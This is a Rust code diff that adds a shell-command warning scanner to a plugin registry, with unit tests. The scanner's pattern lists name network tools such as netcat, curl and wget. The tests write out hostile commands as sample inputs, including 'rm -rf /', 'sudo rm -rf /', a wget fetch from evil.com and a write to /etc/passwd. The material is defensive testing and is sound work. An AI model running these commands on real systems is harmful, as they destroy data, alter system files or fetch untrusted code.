@@ -492,6 +492,100 @@ impl PluginRegistry {
             })
     }
 
+    /// Validate a shell command for potentially dangerous patterns.
+    ///
+    /// Returns a list of security warnings for the command. An empty list means
+    /// no obvious risks were detected (but always review shell commands carefully).
+    ///
+    /// # Security Warnings Detected
+    ///
+    /// - Commands that modify/delete files (rm, del, rmdir, mv, etc.)
+    /// - Commands that download content (curl, wget, etc.)
+    /// - Commands that access network (nc, netcat, ssh, etc.)
+    /// - Commands that modify system (chmod, chown, sudo, etc.)
+    /// - Commands with output redirection (>, >>)
+    /// - Commands with environment variable expansion ($VAR, %VAR%)
+    pub fn validate_shell_command(command: &str) -> Vec<String> {
+        let mut warnings = Vec::new();
+        let cmd_lower = command.to_lowercase();
+
+        // Dangerous file operations
+        let file_ops = [
+            ("rm ", "removes files"),
+            ("rm\t", "removes files"),
+            ("rmdir", "removes directories"),
+            ("del ", "deletes files (Windows)"),
+            ("rd ", "removes directories (Windows)"),
+            ("mv ", "moves/renames files"),
+            ("move ", "moves files (Windows)"),
+            ("cp ", "copies files"),
+            ("copy ", "copies files (Windows)"),
+        ];
+        for (pattern, desc) in file_ops {
+            if cmd_lower.contains(pattern) {
+                warnings.push(format!("Command {} - may modify filesystem", desc));
+            }
+        }
+
+        // Network access
+        let network_ops = [
+            ("curl ", "downloads from network"),
+            ("wget ", "downloads from network"),
+            ("nc ", "network connection (netcat)"),
+            ("netcat", "network connection"),
+            ("ssh ", "SSH connection"),
+            ("scp ", "secure copy over network"),
+            ("rsync", "remote sync"),
+            ("ftp ", "FTP connection"),
+        ];
+        for (pattern, desc) in network_ops {
+            if cmd_lower.contains(pattern) {
+                warnings.push(format!("Command {} - network access", desc));
+            }
+        }
+
+        // Privilege escalation
+        let priv_ops = [
+            ("sudo ", "privilege escalation"),
+            ("su ", "switch user"),
+            ("chmod ", "changes permissions"),
+            ("chown ", "changes ownership"),
+            ("runas", "run as different user (Windows)"),
+        ];
+        for (pattern, desc) in priv_ops {
+            if cmd_lower.contains(pattern) {
+                warnings.push(format!("Command uses {} - elevated privileges", desc));
+            }
+        }
+
+        // Output redirection (could overwrite files)
+        if command.contains(">>") {
+            warnings.push("Command appends to file (>>)".to_string());
+        } else if command.contains('>') && !command.contains(">&") {
+            warnings.push("Command redirects output to file (>)".to_string());
+        }
+
+        // Environment variable expansion (could leak secrets)
+        if command.contains('$') && !command.contains("$'") {
+            warnings.push("Command contains shell variable expansion ($)".to_string());
+        }
+        if command.contains('%') && cfg!(target_os = "windows") {
+            warnings.push("Command may contain Windows variable expansion (%)".to_string());
+        }
+
+        // Eval/exec (code injection risk)
+        if cmd_lower.contains("eval ") || cmd_lower.contains("exec ") {
+            warnings.push("Command uses eval/exec - potential code injection".to_string());
+        }
+
+        // Backticks or $() command substitution
+        if command.contains('`') || command.contains("$(") {
+            warnings.push("Command uses command substitution".to_string());
+        }
+
+        warnings
+    }
+
     /// Execute a shell command as a transformation
     ///
     /// The input text is passed to the command via stdin, and the command's
@@ -516,6 +610,9 @@ impl PluginRegistry {
     /// and the matched text is piped to stdin, not embedded in the command string.
     ///
     /// **Timeout**: Commands have a 30-second timeout to prevent hanging.
+    ///
+    /// Use [`Self::validate_shell_command`] to check for potentially dangerous patterns
+    /// before execution.
     ///
     /// # Example Configuration (TOML)
     /// ```toml
@@ -1213,6 +1310,81 @@ mod tests {
     fn test_shell_command_invalid() {
         let result = PluginRegistry::execute_shell("nonexistent_command_xyz", "input");
         assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_validate_shell_command_safe() {
+        // Safe commands should return no warnings
+        let warnings = PluginRegistry::validate_shell_command("cat");
+        assert!(warnings.is_empty());
+
+        let warnings = PluginRegistry::validate_shell_command("grep pattern");
+        assert!(warnings.is_empty());
+
+        let warnings = PluginRegistry::validate_shell_command("python -c 'print(1)'");
+        assert!(warnings.is_empty());
+    }
+
+    #[test]
+    fn test_validate_shell_command_dangerous_file_ops() {
+        let warnings = PluginRegistry::validate_shell_command("rm -rf /");
+        assert!(!warnings.is_empty());
+        assert!(warnings.iter().any(|w| w.contains("removes files")));
+
+        let warnings = PluginRegistry::validate_shell_command("mv file1 file2");
+        assert!(!warnings.is_empty());
+    }
+
+    #[test]
+    fn test_validate_shell_command_network() {
+        let warnings = PluginRegistry::validate_shell_command("curl http://example.com");
+        assert!(!warnings.is_empty());
+        assert!(warnings.iter().any(|w| w.contains("network")));
+
+        let warnings = PluginRegistry::validate_shell_command("wget http://evil.com/script.sh");
+        assert!(!warnings.is_empty());
+    }
+
+    #[test]
+    fn test_validate_shell_command_privilege() {
+        let warnings = PluginRegistry::validate_shell_command("sudo rm -rf /");
+        assert!(warnings.len() >= 2); // Both sudo and rm warnings
+
+        let warnings = PluginRegistry::validate_shell_command("chmod 777 file");
+        assert!(!warnings.is_empty());
+    }
+
+    #[test]
+    fn test_validate_shell_command_redirection() {
+        let warnings = PluginRegistry::validate_shell_command("echo test > /etc/passwd");
+        assert!(!warnings.is_empty());
+        assert!(warnings.iter().any(|w| w.contains("redirect")));
+
+        let warnings = PluginRegistry::validate_shell_command("cat >> file.txt");
+        assert!(!warnings.is_empty());
+    }
+
+    #[test]
+    fn test_validate_shell_command_variable_expansion() {
+        let warnings = PluginRegistry::validate_shell_command("echo $HOME");
+        assert!(!warnings.is_empty());
+        assert!(warnings.iter().any(|w| w.contains("variable")));
+    }
+
+    #[test]
+    fn test_validate_shell_command_eval() {
+        let warnings = PluginRegistry::validate_shell_command("eval $MALICIOUS");
+        assert!(warnings.len() >= 2); // eval and variable warnings
+    }
+
+    #[test]
+    fn test_validate_shell_command_substitution() {
+        let warnings = PluginRegistry::validate_shell_command("echo $(whoami)");
+        assert!(!warnings.is_empty());
+        assert!(warnings.iter().any(|w| w.contains("substitution")));
+
+        let warnings = PluginRegistry::validate_shell_command("echo `id`");
+        assert!(!warnings.is_empty());
     }
 
     // Transpose plugin tests
